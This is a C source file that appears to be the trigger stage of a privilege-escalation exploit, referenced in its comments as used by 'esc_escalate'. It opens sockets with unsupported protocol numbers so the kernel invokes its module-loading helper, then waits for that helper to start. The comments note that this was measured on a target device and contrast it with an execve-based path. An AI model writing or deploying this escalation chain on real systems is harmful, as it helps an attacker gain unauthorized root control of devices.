/* File-less module-autoload trigger: request_module("net-pf-2-proto-N-type-T").
 * The bad-magic execve path (mpp) is NOT equivalent -- it was only ever proven while
 * already permissive, and in this project the app domain's execve never fired the
 * helper at all, which is why esc_escalate uses this socket form instead. */
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

static const int PROTOS[] = { 253, 254, 99, 89, 47 };
static const int TYPES[] = { SOCK_DGRAM, SOCK_STREAM };

int main(int argc, char **argv)
{
    unsigned i, j;
    int hits = 0;

    for (i = 0; i < sizeof PROTOS / sizeof *PROTOS; i++) {
        for (j = 0; j < sizeof TYPES / sizeof *TYPES; j++) {
            int s = socket(AF_INET, TYPES[j], PROTOS[i]);

            /* EPROTONOSUPPORT *is* the trigger: inet_create() has no ops for that protocol and
             * calls try_then_request_module() before giving up.  Measured on this device: one
             * failing socket() produces TWO helpers, "net-pf-2-proto-N-type-T" and
             * "net-pf-2-proto-N" -- so counting only successes ("once" used to mean "return when
             * a socket succeeded", which never happened here) left the bootstrap firing 20 helpers.
             * With an argument we stop at the first attempt, success or failure. */
            if (s >= 0) {
                printf("proto=%d type=%d created (kernel asked net-pf-2-proto-%d-type-%d)\n",
                       PROTOS[i], TYPES[j], PROTOS[i], TYPES[j]);
                close(s);
                hits++;
            } else {
                printf("proto=%d type=%d socket errno=%d (this fires request_module)\n",
                       PROTOS[i], TYPES[j], errno);
                hits++;
            }
            if (argc > 1)
                goto done;
        }
    }
done:
    printf("attempts=%d; sleeping 3 so the helper can come up\n", hits);
    sleep(3);
    return hits == 0;
}
